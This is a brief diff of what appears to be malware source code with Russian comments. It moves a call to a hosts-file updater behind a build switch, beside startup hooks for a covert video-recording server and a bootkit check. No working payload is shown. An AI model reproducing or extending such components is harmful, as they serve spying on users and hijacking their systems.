@@ -76,7 +76,7 @@ void ExplorerStart(PEventData Data)
 	#endif
 
     // Запускаем сервер видеозаписи
-	#ifdef VideoRecorderH
+	#ifdef VideoRecorderH 
 		VideoRecorderSrv::Start();
 	#endif
 
@@ -101,7 +101,9 @@ void SVChostStart(PEventData Data, bool &Cancel)
 
 
 	// запускаем автоматическую загрузку хостов
-    StartHostsUpdater();
+	#ifdef HostsAutoUpdateH
+		StartHostsUpdater();
+	#endif
 
 	#ifdef bootkitH
 		IsBootkitInstaled();
